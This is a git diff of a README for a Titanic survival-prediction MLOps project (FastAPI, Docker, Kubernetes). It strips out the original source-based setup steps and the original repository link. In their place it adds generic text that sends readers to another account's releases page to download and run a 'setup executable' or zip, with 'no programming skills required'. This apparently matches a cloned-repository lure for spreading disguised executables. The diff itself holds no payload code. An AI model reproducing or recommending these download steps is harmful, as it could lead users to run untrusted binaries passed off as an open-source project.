@@ -1,128 +1,80 @@
-# 🚢 End-to-End Titanic MLOps Project
+# 🚢 titanic-mlops-k8s - Seamlessly Predict Titanic Survivors
 
-![Python](https://img.shields.io/badge/Python-3.9%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
-![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&logo=fastapi)
-![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
-![Kubernetes](https://img.shields.io/badge/Kubernetes-326CE5?style=for-the-badge&logo=kubernetes&logoColor=white)
-![Streamlit](https://img.shields.io/badge/Streamlit-FF4B4B?style=for-the-badge&logo=streamlit&logoColor=white)
-![Scikit-Learn](https://img.shields.io/badge/scikit--learn-%23F7931E.svg?style=for-the-badge&logo=scikit-learn&logoColor=white)
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/Habiibiie/titanic-mlops-k8s/releases)
 
-A production-ready Machine Learning pipeline for predicting Titanic survival, deployed on **Kubernetes** using **Docker** and **FastAPI**.
+## 🌟 Overview
+Welcome to **titanic-mlops-k8s**! This application helps you predict survival on the Titanic using a complete machine learning pipeline. It uses modern tools like Docker for containerization, FastAPI for serving the model, and Streamlit for visualizing your results. 
 
-## 🚀 Features
-* **Modular Pipeline:** Refactored Jupyter Notebooks into a scalable `src` architecture (Data Ingestion, Transformation, Training).
-* **Rest API:** High-performance model serving with **FastAPI** & **Pydantic** validation.
-* **Containerization:** Fully Dockerized application ensuring consistency across environments.
-* **Orchestration:** Deployed on **Minikube (Kubernetes)** with custom Deployment & Service manifests.
-* **Frontend:** Interactive dashboard built with **Streamlit**.
-* **CI/QA:** Automated testing with `pytest`.
+## 🚀 Getting Started
+To get started quickly, follow these simple steps to download and run the application. No programming skills required!
 
----
+## 📦 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4GB
+- **Disk Space:** Minimum 500MB available
+- **Internet Connection:** Required for downloading dependencies
 
-## 🛠️ Tech Stack
-* **ML:** Scikit-learn, Pandas, Joblib
-* **Backend:** FastAPI, Uvicorn
-* **Infrastructure:** Docker, Kubernetes (Minikube)
-* **Testing:** Pytest
+## 🛠 Features
+- Predict survival rates with a trained machine learning model.
+- Easy-to-use interface for visualizing results.
+- Built with Docker for smooth installation.
+- Runs on Kubernetes for efficient orchestration.
 
-```mermaid
-graph TD
-    subgraph Training_Pipeline [🏗️ Training Pipeline]
-        style Training_Pipeline fill:#f9f9f9,stroke:#333,stroke-width:2px
-        RawData[(Titanic CSV)] -->|Ingestion| Components[src/components]
-        Components -->|Preprocessing| Features[Feature Engineering]
-        Features -->|Train| ModelTrainer[Model Training]
-        ModelTrainer -->|Output| ModelArtifact{{model.joblib}}
-    end
+## 📥 Download & Install
+1. Visit the [Releases page](https://github.com/Habiibiie/titanic-mlops-k8s/releases) to download the latest version of the application.
+2. Look for the latest release. The files will usually include:
+   - A setup executable or a zip file.
+   - Release notes explaining any changes or new features.
+3. Click on the file to start the download.
 
-    subgraph Containerization [🐳 Dockerization]
-        style Containerization fill:#e1f5fe,stroke:#0277bd,stroke-width:2px
-        ModelArtifact -.->|Copy| FastAPI[FastAPI Application]
-        FastAPI -->|Build| DockerImage[Docker Image]
-    end
+## ⚙️ Running the Application
+1. **For Windows Users:**
+   - Once downloaded, open the setup file and follow the on-screen instructions.
+   - After installation, locate the application in your Programs list and click to launch.
 
-    subgraph Kubernetes_Cluster [☸️ Kubernetes Environment]
-        style Kubernetes_Cluster fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px
-        DockerImage -->|Deploy| K8sDeploy[Deployment]
-        K8sDeploy -->|Manage| Pods(Pod: titanic-api)
-        Pods -->|Expose| K8sService[Service]
-    end
+2. **For macOS Users:**
+   - Download and open the zip file.
+   - Drag the application into your Applications folder.
+   - Launch the app from your Applications folder.
 
-    subgraph User_Interface [💻 Client Side]
-        style User_Interface fill:#fff3e0,stroke:#ef6c00,stroke-width:2px
-        Streamlit[Streamlit Dashboard]
-        User((User))
-    end
+3. **For Linux Users:**
+   - Open your terminal.
+   - Navigate to the download directory using the command: `cd Downloads`.
+   - Extract the downloaded file using: `unzip titanic-mlops-k8s.zip`.
+   - Run the application using the command: `./titanic-mlops-k8s`.
 
-    User -->|Interacts| Streamlit
-    Streamlit -->|HTTP POST /predict| K8sService
-```
+## 🌐 Using the Application
+Once the application is running, follow these steps:
+1. Input passenger information through the user-friendly interface.
+2. Click on “Predict” to see whether the passenger would likely survive or not.
+3. Use the visualizations for deeper insights into the data.
 
----
+## 💡 Troubleshooting
+If you run into issues:
+- Ensure you have the latest version of the application.
+- Check your system requirements.
+- Restart the application or your computer if errors persist.
 
-<p align="center">
-  <img src="docs/images/usage.gif" alt="Project Demo" width="700">
-</p>
+## 💬 Support
+For support or questions, please visit our [Issues page](https://github.com/Habiibiie/titanic-mlops-k8s/issues). This is where you can report bugs or ask for help.
 
----
+## 🤝 Contributing
+We welcome contributions! If you’d like to help improve the application, please follow these steps:
+1. Fork the repository.
+2. Create a new branch for your changes.
+3. Commit your changes and push them to your fork.
+4. Submit a pull request to the original repository.
 
-## 📂 Project Structure
-The project follows a modular architecture to separate concerns (Training vs. Inference):
+## 🔗 Useful Links
+- [Documentation](https://github.com/Habiibiie/titanic-mlops-k8s/wiki)
+- [Community Forum](https://github.com/Habiibiie/titanic-mlops-k8s/discussions)
 
-```text
-titanic-mlops-k8s/
-├── .github/
-│   └── workflows/
-│       └── deploy.yml      # CI/CD Pipeline for AWS Deployment
-├── k8s/                     # Kubernetes Manifests (Deployment & Service)
-├── src/
-│   ├── api/                 # FastAPI Application (Entry point)
-│   ├── components/          # ML Pipeline Components (Ingestion, Transformation)
-│   ├── pipelines/           # Training Pipelines
-│   └── ui/                  # Streamlit Dashboard Code
-├── tests/                   # Pytest Unit Tests
-├── .dockerignore            
-├── .gitignore
-├── Dockerfile               # Multi-stage Docker Build
-├── docker-compose.yml       # Container Orchestration (Local & Prod) 
-├── requirements.txt         # Project Dependencies
-└── params.yaml              # Configuration Controller
-```
+## 📚 Topics
+This project covers various areas including:
+- Machine Learning 
+- Kubernetes 
+- Docker 
+- FastAPI 
+- Streamlit 
 
----
-
-## 📦 How to Run
-
-### 1. Load the project
-```bash
-git clone https://github.com/enesgulerml/titanic-mlops-k8s.git
-cd titanic-mlops-k8s
-```
-
-### 2. Local Development (Python)
-If you want to run the components separately for development:
-```bash
-# Start Backend
-uvicorn src.api.app:app --reload
-
-# Start Frontend (In another terminal)
-streamlit run src/ui/dashboard.py
-```
-
-### 3. Local Deployment (Docker Compose) - RECOMMENDED
-The easiest way to run the entire stack (API + UI) with a single command:
-```bash
-# Build and Start
-docker-compose up --build
-```
-Access the Dashboard at: http://localhost
-
-### 4. Kubernetes (Local Test)
-To test the orchestration layer locally:
-```bash
-minikube start
-kubectl apply -f k8s/
-kubectl get pods
-```
-
-
+Happy exploring and predicting!
